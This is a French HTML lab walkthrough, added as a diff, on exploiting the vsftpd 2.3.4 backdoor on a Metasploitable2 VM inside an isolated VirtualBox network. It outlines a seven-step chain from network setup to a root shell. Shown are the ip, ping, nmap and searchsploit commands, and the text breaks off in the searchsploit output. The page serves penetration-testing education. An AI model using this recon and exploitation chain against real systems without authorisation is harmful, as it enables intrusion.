@@ -1,0 +1,1392 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vsftpd 2.3.4 — Anatomie d'une backdoor</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0b0e14;
+    --panel:#12161f;
+    --panel-alt:#161b26;
+    --border:#232937;
+    --text:#e7e9ee;
+    --muted:#8b93a5;
+    --accent:#ff8a5c;
+    --accent-soft:#ff8a5c22;
+    --ok:#5fd9a4;
+    --ok-soft:#5fd9a422;
+    --serif:'Fraunces', serif;
+    --sans:'IBM Plex Sans', sans-serif;
+    --mono:'IBM Plex Mono', monospace;
+  }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--sans);
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  ::selection{background:var(--accent-soft); color:var(--accent);}
+
+  a{color:var(--accent);}
+
+  .wrap{
+    max-width:760px;
+    margin:0 auto;
+    padding:0 24px;
+  }
+
+  /* ---------- HERO ---------- */
+  .hero{
+    padding:96px 0 64px;
+    border-bottom:1px solid var(--border);
+  }
+  .breadcrumb{margin:0 0 18px;}
+  .breadcrumb a{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--muted);
+    text-decoration:none;
+    border-bottom:1px solid transparent;
+  }
+  .breadcrumb a:hover{color:var(--accent); border-bottom-color:var(--accent);}
+  .hero .kicker{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+    margin:0 0 20px;
+  }
+  .hero .kicker::before{content:"$ "; color:var(--muted);}
+  .hero h1{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:clamp(34px,5vw,52px);
+    line-height:1.1;
+    margin:0 0 20px;
+    letter-spacing:-0.01em;
+  }
+  .hero p.lead{
+    font-size:17px;
+    color:var(--muted);
+    max-width:56ch;
+    margin:0 0 32px;
+  }
+  .meta-row{
+    display:flex;
+    flex-wrap:wrap;
+    gap:28px;
+  }
+  .meta-item{font-size:13px;}
+  .meta-item .label{
+    display:block;
+    color:var(--muted);
+    margin-bottom:4px;
+  }
+  .meta-item .value{
+    font-family:var(--mono);
+    color:var(--text);
+  }
+  .badge{
+    display:inline-block;
+    font-family:var(--mono);
+    font-size:12px;
+    padding:3px 10px;
+    border:1px solid var(--ok);
+    color:var(--ok);
+    border-radius:3px;
+  }
+  .score-badge{
+    display:inline-block;
+    font-family:var(--mono);
+    font-size:12px;
+    padding:3px 10px;
+    border-radius:3px;
+  }
+
+  /* ---------- SECTION GENERIC ---------- */
+  section{
+    padding:64px 0;
+    border-bottom:1px solid var(--border);
+  }
+  section:last-of-type{border-bottom:none;}
+  h2.section-title{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:28px;
+    margin:0 0 12px;
+  }
+  .section-intro{
+    color:var(--muted);
+    max-width:60ch;
+    margin:0 0 40px;
+    font-size:15px;
+  }
+
+  /* ---------- TIMELINE ---------- */
+  .timeline{
+    position:relative;
+    padding-left:44px;
+  }
+  .timeline::before{
+    content:"";
+    position:absolute;
+    left:15px;
+    top:6px;
+    bottom:6px;
+    width:1px;
+    background:var(--border);
+  }
+  .step{
+    position:relative;
+    margin-bottom:56px;
+  }
+  .step:last-child{margin-bottom:0;}
+  .step-num{
+    position:absolute;
+    left:-44px;
+    top:0;
+    width:32px;
+    height:32px;
+    border-radius:50%;
+    background:var(--panel);
+    border:1px solid var(--border);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+  }
+  .step h3{
+    font-family:var(--sans);
+    font-weight:600;
+    font-size:19px;
+    margin:2px 0 6px;
+  }
+  .step .step-sub{
+    color:var(--muted);
+    font-size:14px;
+    margin:0 0 18px;
+  }
+
+  /* ---------- TERMINAL BLOCK ---------- */
+  .term{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+    margin:0 0 18px;
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:9px 14px;
+    background:var(--panel-alt);
+    border-bottom:1px solid var(--border);
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+  }
+  .term-bar .dot{
+    width:7px; height:7px; border-radius:50%;
+    background:var(--border);
+  }
+  .term pre{
+    margin:0;
+    padding:16px 18px;
+    font-family:var(--mono);
+    font-size:13px;
+    line-height:1.65;
+    overflow-x:auto;
+    white-space:pre-wrap;
+    word-break:break-word;
+  }
+  .term .prompt{color:var(--accent);}
+  .term .out{color:var(--muted);}
+  .term .ok{color:var(--ok);}
+  .term .flag{color:var(--accent);}
+
+  /* ---------- BOUTON COPIER (discret, par commande) ---------- */
+  .copy-btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    width:20px;
+    height:20px;
+    margin-left:8px;
+    padding:0;
+    border:1px solid transparent;
+    border-radius:4px;
+    background:transparent;
+    color:var(--muted);
+    font-size:12px;
+    line-height:1;
+    cursor:pointer;
+    vertical-align:middle;
+    opacity:.55;
+    transition:opacity .15s, border-color .15s, color .15s, background .15s;
+  }
+  .term:hover .copy-btn{opacity:.9;}
+  .copy-btn:hover{opacity:1; border-color:var(--border); background:var(--panel-alt); color:var(--accent);}
+  .copy-btn.copied{opacity:1; border-color:var(--ok); color:var(--ok);}
+
+  /* ---------- EXPLAIN BOX ---------- */
+  .explain{
+    display:grid;
+    grid-template-columns:auto 1fr;
+    gap:10px 12px;
+    background:transparent;
+    border-left:2px solid var(--border);
+    padding:2px 0 2px 18px;
+    margin-top:14px;
+  }
+  .explain .k{
+    font-family:var(--mono);
+    font-size:11px;
+    color:var(--muted);
+    padding-top:2px;
+    white-space:nowrap;
+  }
+  .explain .v{
+    font-size:14.5px;
+    color:var(--text);
+  }
+  .explain .v strong{color:var(--accent); font-weight:600;}
+  .explain .k.err{color:#ff5c72;}
+  .explain .v em.err-em{color:#ff5c72; font-style:normal; font-weight:600;}
+
+  /* ---------- MÉTHODE EXACTE (playbook récapitulatif) ---------- */
+  .playbook{
+    display:flex;
+    flex-direction:column;
+    gap:0;
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+    margin-bottom:40px;
+  }
+  .playbook-row{
+    display:grid;
+    grid-template-columns:28px 1fr 1.3fr;
+    gap:16px;
+    padding:14px 18px;
+    border-bottom:1px solid var(--border);
+    background:var(--panel);
+  }
+  .playbook-row:last-child{border-bottom:none;}
+  .playbook-num{
+    font-family:var(--mono);
+    color:var(--accent);
+    font-size:13px;
+  }
+  .playbook-what strong{
+    display:block;
+    font-size:14px;
+    color:var(--text);
+    margin-bottom:3px;
+  }
+  .playbook-what span{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--ok);
+  }
+  .playbook-why{
+    font-size:13px;
+    color:var(--muted);
+  }
+  @media (max-width:640px){
+    .playbook-row{grid-template-columns:1fr; gap:4px;}
+    .playbook-num{display:none;}
+  }
+
+  /* ---------- CHEATSHEET TABLE ---------- */
+  .cheat-group{margin-bottom:32px;}
+  .cheat-group h4{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+    margin:0 0 14px;
+    font-weight:500;
+  }
+  table.cheat{
+    width:100%;
+    border-collapse:collapse;
+    font-size:14px;
+  }
+  table.cheat td{
+    padding:10px 0;
+    border-bottom:1px solid var(--border);
+    vertical-align:top;
+  }
+  table.cheat td.cmd{
+    font-family:var(--mono);
+    color:var(--ok);
+    width:42%;
+    padding-right:20px;
+    white-space:nowrap;
+  }
+  table.cheat td.desc{color:var(--muted);}
+  table.cheat tr:last-child td{border-bottom:none;}
+
+  /* ---------- CONCEPT CARDS ---------- */
+  .concepts{
+    display:flex;
+    flex-direction:column;
+    gap:22px;
+  }
+  .concept{
+    padding:20px 0;
+    border-top:1px solid var(--border);
+  }
+  .concept:first-child{border-top:none; padding-top:0;}
+  .concept h4{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:18px;
+    margin:0 0 8px;
+  }
+  .concept p{
+    color:var(--muted);
+    margin:0;
+    font-size:14.5px;
+    max-width:62ch;
+  }
+
+  /* ---------- TERMINAL D'ENTRAÎNEMENT ---------- */
+  .practice-wrap{
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+  .info-bar{
+    display:flex;
+    flex-wrap:wrap;
+    gap:10px 28px;
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:13px 18px;
+    font-family:var(--mono);
+    font-size:12.5px;
+  }
+  .info-bar .item{color:var(--muted);}
+  .info-bar .item strong{color:var(--accent); font-weight:500;}
+
+  .sim{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+  }
+  .sim-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:10px;
+    padding:9px 14px;
+    background:var(--panel-alt);
+    border-bottom:1px solid var(--border);
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+  }
+  .sim-progress{color:var(--accent);}
+  .sim-body{
+    padding:16px 18px;
+    font-family:var(--mono);
+    font-size:13px;
+    line-height:1.7;
+    max-height:420px;
+    overflow-y:auto;
+  }
+  .sim-line{margin:0 0 4px; white-space:pre-wrap; word-break:break-word;}
+  .sim-line .p{color:var(--accent);}
+  /* ---------- PROMPT RÉALISTE (style Kali / zsh deux lignes) ---------- */
+  .p-kali{display:inline-flex; flex-direction:column; line-height:1.4; vertical-align:top;}
+  .p-kali .p-user{color:var(--ok); font-weight:600;}
+  .p-kali .p-punc{color:var(--muted);}
+  .p-kali .p-dollar{color:var(--accent); margin-left:4px;}
+  .p-root{color:#ff5c72; font-weight:600;}
+  .p-path{color:#5fbfff;}
+  .sim-line .o{color:var(--muted); display:block;}
+  .sim-line .o.ok{color:var(--ok);}
+  .sim-line .o.err{color:#ff5c72;}
+  .sim-line.appear{animation:fadeSlideIn .3s ease both;}
+  @keyframes fadeSlideIn{
+    from{opacity:0; transform:translateY(4px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+
+  /* ligne mise en valeur pendant la correction */
+  .sim-line.hl{
+    background:rgba(255,138,92,.12);
+    border-radius:4px;
+    padding:2px 6px;
+    margin:0 -6px 4px;
+    animation:pulseGlow 1.3s ease-in-out 2;
+  }
+  @keyframes pulseGlow{
+    0%,100%{box-shadow:0 0 0 rgba(255,138,92,0);}
+    50%{box-shadow:0 0 14px rgba(255,138,92,.45);}
+  }
+
+  /* annotation ajoutée lors d'une correction d'analyse */
+  .sim-annot{
+    margin:2px 0 10px;
+    padding:8px 12px;
+    border-left:2px solid var(--accent);
+    color:var(--accent);
+    font-size:12.5px;
+    background:var(--accent-soft);
+    border-radius:0 6px 6px 0;
+  }
+
+  /* la ligne de saisie vit DANS le flux du terminal, comme un vrai shell —
+     c'est la dernière ligne, elle défile avec le reste, pas de bloc à part */
+  .sim-inputline{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    margin:0 0 4px;
+  }
+  .sim-inputline .p{color:var(--accent); flex-shrink:0;}
+  .sim-input{
+    flex:1;
+    background:transparent;
+    border:none;
+    outline:none;
+    color:var(--text);
+    font-family:var(--mono);
+    font-size:13px;
+    caret-color:var(--accent);
+    padding:0;
+  }
+  .sim-input::placeholder{color:var(--muted); opacity:.6;}
+  .sim-controls{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:10px 18px 16px;
+    border-top:1px solid var(--border);
+    flex-wrap:wrap;
+  }
+  .sim-btn{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--text);
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:6px 12px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    transition:border-color .15s, transform .1s;
+  }
+  .sim-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
+  .sim-btn:active{transform:translateY(0);}
+  .sim-btn:disabled{opacity:.3; cursor:default; transform:none;}
+  .sim-btn.continue{border-color:var(--accent); color:var(--accent);}
+
+  .sim-hint-box{
+    margin:0 18px 12px;
+    padding:10px 14px;
+    border-left:2px solid var(--accent);
+    font-size:13px;
+    color:var(--muted);
+    max-height:0;
+    opacity:0;
+    overflow:hidden;
+    transition:max-height .25s ease, opacity .25s ease, padding .25s ease, margin .25s ease;
+  }
+  .sim-hint-box.show{
+    max-height:120px;
+    opacity:1;
+  }
+
+  @media (max-width:640px){
+    .sim-body{max-height:320px;}
+  }
+
+  /* ---------- BOUTON D'OUVERTURE DU TERMINAL ---------- */
+  .term-launch{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:28px;
+    display:flex;
+    flex-direction:column;
+    align-items:flex-start;
+    gap:12px;
+  }
+  .term-launch-btn{
+    font-family:var(--mono);
+    font-size:14px;
+    font-weight:600;
+    color:#05100b;
+    background:var(--ok);
+    border:none;
+    border-radius:8px;
+    padding:13px 24px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .term-launch-btn:hover{transform:translateY(-1px); box-shadow:0 8px 22px rgba(95,217,164,.28);}
+  .term-launch-btn:active{transform:translateY(0);}
+  .term-launch-dot{
+    width:8px; height:8px; border-radius:50%;
+    background:#05100b;
+    animation:launchBlink 1.6s ease-in-out infinite;
+  }
+  @keyframes launchBlink{0%,100%{opacity:1;} 50%{opacity:.2;}}
+  .term-launch-sub{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+    margin:0;
+  }
+
+  /* ---------- OVERLAY PLEIN ÉCRAN ---------- */
+  .term-fullscreen{
+    position:fixed;
+    inset:0;
+    z-index:9999;
+    display:none;
+    flex-direction:column;
+    background:radial-gradient(circle at 50% 0%, #131826 0%, #05070a 72%);
+    opacity:0;
+    transform:scale(.98);
+    transition:opacity .22s ease, transform .22s ease;
+  }
+  .term-fullscreen.open{
+    display:flex;
+    opacity:1;
+    transform:scale(1);
+  }
+  .term-fs-header{
+    flex-shrink:0;
+    border-bottom:1px solid var(--border);
+    background:var(--panel);
+    padding:14px 22px 16px;
+  }
+  .term-fs-headrow{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:12px;
+  }
+  .term-fs-titlebar{
+    display:flex;
+    align-items:center;
+    gap:7px;
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--muted);
+  }
+  .term-fs-dot{width:9px; height:9px; border-radius:50%; display:inline-block;}
+  .term-fs-dot.r{background:#ff5f57;}
+  .term-fs-dot.y{background:#febc2e;}
+  .term-fs-dot.g{background:#28c840;}
+  .term-fs-context{margin-left:8px; color:var(--text);}
+  .term-fs-close{
+    font-family:var(--mono);
+    font-size:13px;
+    background:transparent;
+    border:1px solid var(--border);
+    color:var(--muted);
+    border-radius:6px;
+    width:30px; height:30px;
+    cursor:pointer;
+    transition:border-color .15s, color .15s, transform .15s;
+  }
+  .term-fs-close:hover{border-color:var(--accent); color:var(--accent); transform:translateY(-1px);}
+  .term-fs-info{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:8px 22px;
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--muted);
+    margin-bottom:14px;
+  }
+  .term-fs-info .item strong{color:var(--accent); font-weight:500;}
+
+  /* ---------- CONSIGNE FIXE (toujours visible, comme les infos IP) ---------- */
+  .term-fs-consigne{
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    margin-top:14px;
+    padding:10px 12px;
+    background:var(--accent-soft);
+    border:1px solid var(--accent);
+    border-radius:6px;
+  }
+  .consigne-tag{
+    flex-shrink:0;
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:.07em;
+    text-transform:uppercase;
+    color:var(--accent);
+    border:1px solid var(--accent);
+    border-radius:3px;
+    padding:2px 7px;
+    margin-top:1px;
+  }
+  .consigne-text{
+    font-family:var(--sans);
+    font-size:13.5px;
+    color:var(--text);
+    line-height:1.5;
+  }
+  .term-fs-info .item.mode{
+    text-transform:uppercase;
+    letter-spacing:.06em;
+    color:var(--ok);
+    font-size:10.5px;
+    border:1px solid var(--ok);
+    padding:3px 9px;
+    border-radius:3px;
+    transition:color .2s, border-color .2s;
+  }
+  .term-progress{
+    display:flex;
+    align-items:center;
+    gap:14px;
+  }
+  .term-progress-track{
+    flex:1;
+    height:6px;
+    border-radius:3px;
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    overflow:hidden;
+  }
+  .term-progress-fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg, var(--ok), var(--accent));
+    border-radius:3px;
+    transition:width .5s cubic-bezier(.4,0,.2,1);
+    box-shadow:0 0 10px rgba(95,217,164,.55);
+  }
+  .term-progress-label{
+    font-family:var(--mono);
+    font-size:11.5px;
+    color:var(--accent);
+    white-space:nowrap;
+  }
+
+  .term-fullscreen .sim-body{
+    flex:1;
+    overflow-y:auto;
+    max-height:none;
+    padding:20px 26px;
+    transition:filter .25s ease;
+  }
+  .term-fullscreen .sim-body.dimmed{
+    filter:brightness(.5) saturate(.85);
+    pointer-events:none;
+  }
+  .term-fs-footer{
+    flex-shrink:0;
+    border-top:1px solid var(--border);
+    background:var(--panel);
+  }
+  .term-fs-footer .sim-hint-box{margin:10px 22px 0;}
+  .term-fs-footer .sim-controls{padding:10px 22px 14px;}
+
+  /* ---------- POP-UP D'ANALYSE (remplace indice/solution/continuer en mode analyse) ---------- */
+  .analyze-popup{
+    margin:16px 22px 0;
+    padding:16px 18px;
+    border-radius:10px;
+    border:1px solid var(--accent);
+    background:linear-gradient(180deg, var(--accent-soft), var(--panel-alt) 75%);
+    box-shadow:0 14px 34px rgba(0,0,0,.4), 0 0 0 1px rgba(255,138,92,.08);
+    display:none;
+    flex-direction:column;
+    gap:12px;
+    animation:popIn .3s cubic-bezier(.34,1.56,.64,1) both;
+  }
+  .analyze-popup.leaving{animation:popOut .18s ease both;}
+  @keyframes popIn{
+    from{opacity:0; transform:translateY(14px) scale(.96);}
+    to{opacity:1; transform:translateY(0) scale(1);}
+  }
+  @keyframes popOut{
+    from{opacity:1; transform:scale(1);}
+    to{opacity:0; transform:scale(.95);}
+  }
+  .ap-tag{
+    align-self:flex-start;
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:.07em;
+    text-transform:uppercase;
+    color:var(--accent);
+    border:1px solid var(--accent);
+    border-radius:3px;
+    padding:3px 8px;
+  }
+  .ap-question{
+    font-family:var(--sans);
+    font-size:14.5px;
+    color:var(--text);
+    line-height:1.55;
+    margin:0;
+  }
+  .ap-hint{
+    font-size:13px;
+    color:var(--muted);
+    max-height:0;
+    opacity:0;
+    overflow:hidden;
+    border-left:2px solid var(--accent);
+    padding-left:0;
+    transition:max-height .25s ease, opacity .25s ease, padding .25s ease;
+  }
+  .ap-hint.show{max-height:200px; opacity:1; padding:8px 0 8px 12px;}
+  .ap-actions{display:flex; gap:8px; flex-wrap:wrap; align-items:center;}
+  .ap-btn{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--text);
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:6px 12px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    transition:border-color .15s, transform .1s;
+  }
+  .ap-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
+  .ap-btn.ap-continue{
+    margin-left:auto;
+    border-color:var(--ok);
+    color:var(--ok);
+    font-weight:600;
+    animation:ctaPulse 1.8s ease-in-out infinite;
+  }
+  @keyframes ctaPulse{
+    0%,100%{box-shadow:0 0 0 rgba(95,217,164,0);}
+    50%{box-shadow:0 0 16px rgba(95,217,164,.5);}
+  }
+
+  /* animation sobre au passage d'une étape à l'autre */
+  @keyframes successFlash{
+    0%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
+    35%{box-shadow:inset 0 0 46px rgba(95,217,164,.16);}
+    100%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
+  }
+  .sim-body.flash-ok{animation:successFlash .65s ease;}
+
+  @keyframes progressPulse{
+    0%,100%{box-shadow:0 0 10px rgba(95,217,164,.55);}
+    50%{box-shadow:0 0 18px rgba(95,217,164,.85);}
+  }
+  .term-progress-fill.pulse{animation:progressPulse .65s ease;}
+
+  /* ---------- FOOTER ---------- */
+  footer{
+    padding:48px 0 80px;
+  }
+  footer .note{
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--muted);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:16px 18px;
+    background:var(--panel);
+  }
+  footer .note .ok{color:var(--ok);}
+
+  @media (max-width:600px){
+    .hero{padding:64px 0 48px;}
+    .timeline{padding-left:34px;}
+    .step-num{left:-34px; width:26px; height:26px; font-size:11px;}
+    .explain{grid-template-columns:1fr;}
+    .explain .k{padding-top:0;}
+    .practice-wrap{grid-template-columns:1fr;}
+    .info-panel{position:static;}
+  }
+</style>
+</head>
+<body>
+
+  <div class="wrap">
+    <div class="hero">
+      <p class="breadcrumb"><a href="index.html">← Hub</a></p>
+      <p class="kicker">metasploitable2 :: recon → exploit → post-exploit</p>
+      <h1>vsftpd 2.3.4<br>Anatomie d'une backdoor</h1>
+      <p class="lead">Premier exploit du lab : du scan réseau jusqu'à un shell root, avec à chaque étape ce qu'il faut comprendre — pas seulement ce qu'il faut taper.</p>
+      <div class="meta-row">
+        <div class="meta-item"><span class="label">Cible</span><span class="value">Metasploitable2 · 192.168.56.20</span></div>
+        <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.10</span></div>
+        <div class="meta-item"><span class="label">Réseau</span><span class="value">Réseau interne VirtualBox (isolé)</span></div>
+        <div class="meta-item"><span class="label">Résultat</span><span class="badge">root obtenu</span></div>
+        <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#5fd9a4; border:1px solid #5fd9a4; background:#5fd9a418;">1/10 · Introduction</span></div>
+        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#ff5c72; border:1px solid #ff5c72; background:#ff5c7218;">4/5 · Contrôle total</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <section id="chrono">
+      <h2 class="section-title">Chronologie</h2>
+      <p class="section-intro">Sept étapes, dans l'ordre où elles doivent se faire — chacune répond à une question précise avant de passer à la suivante.</p>
+
+      <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
+      <div class="playbook">
+        <div class="playbook-row">
+          <div class="playbook-num">1</div>
+          <div class="playbook-what"><strong>Mise en réseau</strong><span>ip addr / ifconfig</span></div>
+          <div class="playbook-why">Placer Kali et la cible sur le même sous-réseau isolé — sans ça, aucune couche au-dessus ne peut fonctionner.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">2</div>
+          <div class="playbook-what"><strong>Vérification</strong><span>ping</span></div>
+          <div class="playbook-why">Confirmer que la connectivité de base existe, pour ne pas confondre un problème réseau avec une absence de faille.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">3</div>
+          <div class="playbook-what"><strong>Reconnaissance</strong><span>nmap -sV -sC</span></div>
+          <div class="playbook-why">Lister les services ouverts et surtout leurs <strong>versions exactes</strong> — une faille cible toujours une version précise, jamais un service en général.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">4</div>
+          <div class="playbook-what"><strong>Recherche d'exploit</strong><span>searchsploit</span></div>
+          <div class="playbook-why">Croiser chaque version repérée avec une base d'exploits publics, en élargissant la recherche si un premier essai trop précis échoue.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">5</div>
+          <div class="playbook-what"><strong>Sélection du module</strong><span>msfconsole / search / use</span></div>
+          <div class="playbook-why">Charger précisément le module qui correspond à la version vue par nmap, en écartant ceux qui ne font que planter le service (rank faible, chemin auxiliary/).</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">6</div>
+          <div class="playbook-what"><strong>Configuration</strong><span>set RHOSTS / set LHOST</span></div>
+          <div class="playbook-why">Donner au module la cible (RHOSTS) et, pour un payload reverse, l'adresse à laquelle il doit rappeler (LHOST) — jamais l'inverse.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">7</div>
+          <div class="playbook-what"><strong>Exploitation</strong><span>exploit / run</span></div>
+          <div class="playbook-why">Déclencher le module, vérifier l'accès obtenu (getuid) avant toute chose, puis basculer en shell système pour la suite.</div>
+        </div>
+      </div>
+
+      <div class="timeline">
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <h3>Sortir les deux VM du NAT</h3>
+          <p class="step-sub">En NAT, chaque VM a sa propre sortie internet mais ne voit pas l'autre. Il faut les mettre sur un même segment réseau isolé.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> sudo ip addr add 192.168.56.10/24 dev eth0<button class="copy-btn" type="button" data-copy="sudo ip addr add 192.168.56.10/24 dev eth0" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="prompt">$</span> sudo ip link set eth0 up<button class="copy-btn" type="button" data-copy="sudo ip link set eth0 up" aria-label="Copier la commande" title="Copier">⧉</button></pre>
+          </div>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>msfadmin@metasploitable</div>
+            <pre><span class="prompt">$</span> sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up<button class="copy-btn" type="button" data-copy="sudo ifconfig eth0 192.168.56.20 netmask 255.255.255.0 up" aria-label="Copier la commande" title="Copier">⧉</button></pre>
+          </div>
+          <div class="explain">
+            <span class="k">pourquoi</span><span class="v">En <strong>Réseau interne</strong>, il n'y a pas de serveur DHCP : personne ne distribue d'IP automatiquement. On en fixe une à la main sur chaque machine, dans le même sous-réseau (<strong>192.168.56.0/24</strong>).</span>
+            <span class="k">attention</span><span class="v">Cette IP n'est pas persistante : un redémarrage de la VM l'efface, il faut la retaper.</span>
+            <span class="k">retenir</span><span class="v"><strong>ip addr add</strong> (Kali / Debian récent) et <strong>ifconfig</strong> (vieux système comme Metasploitable2) font la même chose : assigner une IP à une interface.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <h3>Vérifier que les deux machines se voient</h3>
+          <p class="step-sub">Avant tout scan, confirmer que la couche réseau fonctionne.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> ping 192.168.56.20<button class="copy-btn" type="button" data-copy="ping 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">64 bytes from 192.168.56.20: icmp_seq=1 ttl=64 time=1.1 ms</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">pourquoi</span><span class="v">Un scan ou un exploit qui échoue peut avoir deux causes très différentes : la cible n'est pas vulnérable, <em>ou</em> le réseau ne fonctionne pas. Le ping élimine la seconde avant de chercher plus loin.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <h3>Reconnaissance — nmap</h3>
+          <p class="step-sub">Découvrir les services actifs et leurs versions exactes, avant toute idée d'attaque.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> nmap -sV -sC 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -sC 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">21/tcp   open  ftp    vsftpd 2.3.4</span>
+<span class="out">|_ftp-anon: Anonymous FTP login allowed</span>
+<span class="out">22/tcp   open  ssh    OpenSSH 4.7p1 Debian 8ubuntu1</span>
+<span class="out">23/tcp   open  telnet Linux telnetd</span>
+<span class="out">80/tcp   open  http   Apache httpd 2.2.8</span>
+<span class="out">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian</span>
+<span class="out">…</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">-sV</span><span class="v">détecte la <strong>version</strong> exacte de chaque service — indispensable, car une faille est liée à une version précise, pas juste à un type de service.</span>
+            <span class="k">-sC</span><span class="v">lance les scripts de base nmap : bannières, certificats, options d'authentification autorisées.</span>
+            <span class="k">192.168.56.20</span><span class="v">dernier paramètre de la commande : l'adresse IP de la <strong>cible</strong> à scanner — c'est elle qui reçoit les paquets de sondage envoyés par nmap, contrairement aux flags qui, eux, configurent le comportement du scanner.</span>
+            <span class="k">triage</span><span class="v">Face à 20 ports ouverts, on classe par risque : versions <strong>anciennes</strong> (Apache 2.2.8, Samba 3.0.20 datent de 2008), protocoles <strong>en clair</strong> par nature (telnet, rlogin), et signaux directs comme <strong>anonymous login allowed</strong>.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <h3>Recherche d'exploit — searchsploit</h3>
+          <p class="step-sub">Croiser la version vue par nmap avec la base d'exploits publics de Kali.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> searchsploit vsftpd<button class="copy-btn" type="button" data-copy="searchsploit vsftpd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">------------------------------------------------------- ---------------------------------
+ Exploit Title                                         |  Path
+------------------------------------------------------- ---------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Denial of Service | linux/dos/5814.txt
